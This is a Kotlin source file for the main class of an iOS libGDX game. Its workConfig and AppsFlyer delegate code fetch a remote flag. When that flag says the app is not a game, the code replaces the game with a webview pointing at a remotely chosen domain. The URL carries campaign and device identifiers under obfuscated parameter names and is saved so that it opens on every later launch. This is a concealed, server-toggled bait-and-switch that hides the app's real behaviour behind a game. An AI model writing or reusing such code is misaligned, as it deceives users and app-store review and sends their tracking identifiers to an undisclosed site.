package com.smarteca.foundsender

import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.smarteca.foundsender.game.dataStore.DS_SavingData
import com.smarteca.foundsender.game.dataStore.DS_TestProgressData
import com.smarteca.foundsender.game.manager.*
import com.smarteca.foundsender.game.manager.util.MusicUtil
import com.smarteca.foundsender.game.manager.util.SoundUtil
import com.smarteca.foundsender.game.manager.util.SpriteUtil
import com.smarteca.foundsender.game.screens.LoaderScreen
import com.smarteca.foundsender.game.utils.GameColor
import com.smarteca.foundsender.game.utils.advanced.AdvancedGame
import com.smarteca.foundsender.game.utils.disposeAll
import com.smarteca.foundsender.game.utils.log
import com.smarteca.foundsender.util.AppsFlyerManager
import com.smarteca.foundsender.util.Gist
import com.smarteca.foundsender.util.WebUtil
import kotlinx.coroutines.*
import org.robovm.apple.foundation.NSDictionary
import org.robovm.apple.foundation.NSError
import org.robovm.apple.foundation.NSString
import org.robovm.pods.appsflyer.AppsFlyerLibDelegateAdapter
import java.util.concurrent.atomic.AtomicBoolean

enum class ConfigState {
    Loading, ToGame, ToAccessOrStartAppsFlyer,
}

var GLOBAL_ConfigState: ConfigState = ConfigState.Loading
var GLOBAL_isFirstOpenGameScreen = false

/** [com.badlogic.gdx.ApplicationListener] implementation shared by all platforms. */
class GdxGame(val iosLauncher: IOSLauncher) : AdvancedGame() {

    lateinit var assetManager     : AssetManager private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager private set
    lateinit var musicManager     : MusicManager private set
    lateinit var soundManager     : SoundManager private set

    val assetsAccess by lazy { SpriteUtil.Access() }
    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil() }
    val soundUtil by lazy { SoundUtil() }

    var backgroundColor = GameColor.background
    val disposableSet = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    //lateinit var currentBackground: Texture

    val statusBarHeight by lazy { iosLauncher.getStatusBarHeightInPixels() }

    //val ds_Balance = DS_Balance(coroutine)
    val ds_SavingData       = DS_SavingData(coroutine)
    val ds_TestProgressData = DS_TestProgressData(coroutine)

    override fun create() {
        //iosLauncher.artur()
        ds_SavingData.initialize()
        ds_TestProgressData.initialize()

        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager = MusicManager(assetManager)
        soundManager = SoundManager(assetManager)

        workConfig()

        navigationManager.navigate(LoaderScreen::class.java.name)

    }

    override fun pause() {
        log("GdxGame: pause")
        super.pause()
        if (GLOBAL_isFirstOpenGameScreen) musicUtil.currentMusic?.pause()
    }

    override fun resume() {
        log("GdxGame: resume")
        super.resume()
        if (GLOBAL_isFirstOpenGameScreen) musicUtil.currentMusic?.play()
    }

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) {
            log("exception: ${e.message}")
        }
    }

    // Logic ------------------------------------------------------------

    private fun workConfig() {
        log("workConfig")

        val sharedData = PreferencesManager.getString("superKey", "first")

        try {
            if (sharedData == "first") {
                coroutine.launch(Dispatchers.Default) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (getJSON != null) {
                        if (getJSON.isGame == "true") {
                            GLOBAL_ConfigState = ConfigState.ToGame
                        } else {
                            AppsFlyerManager.apply {
                                initialize(getJSON.dev, getJSON.app)
                                appsFlyerLib.delegate = getAppsFlyerLibDelegateAdapter(getJSON.dom)
                            }
                            GLOBAL_ConfigState = ConfigState.ToAccessOrStartAppsFlyer
                        }
                    } else {
                        GLOBAL_ConfigState = ConfigState.ToGame
                    }

                }
            } else {
                WebUtil.openUrlWebView(sharedData)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GLOBAL_ConfigState = ConfigState.ToGame
        }

    }

    private fun getAppsFlyerLibDelegateAdapter(dom: String) = object : AppsFlyerLibDelegateAdapter() {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(conversionData: NSDictionary<*, *>?) {
            log("✅ AppsFlyer: onSuccess - Conversion Data: $conversionData")

            if (conversionData != null) {
                val campaign = (conversionData["campaign"]     as? NSString)?.toString()
                val afAd     = (conversionData["af_ad"]        as? NSString)?.toString()
                val media    = (conversionData["media_source"] as? NSString)?.toString()

                val afId = AppsFlyerManager.appsFlyerLib.appsFlyerUID

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | afId = $afId")

                val link = "$dom?gvlgbe=$campaign&gxgwc=$afAd&rgeqdxbh=$media&xpriefa=$afId"
                log("link = $link")

                PreferencesManager.saveString("superKey", link)

                WebUtil.openUrlWebView(link)

            } else GLOBAL_ConfigState = ConfigState.ToGame

        }

        override fun onConversionDataFail(errorMessage: NSError?) {
            log("❌ AppsFlyer: onError - $errorMessage")

            if (isAppsflyerGetData.getAndSet(true)) return
            GLOBAL_ConfigState = ConfigState.ToGame
        }

        override fun onAppOpenAttribution(attributionData: NSDictionary<*, *>?) {
            log("🔄 AppsFlyer: onAppOpenAttribution - $attributionData")
        }

        override fun onAppOpenAttributionFailure(error: NSError?) {
            log("❌ AppsFlyer: onAttributionFailure - $error")
        }
    }

}
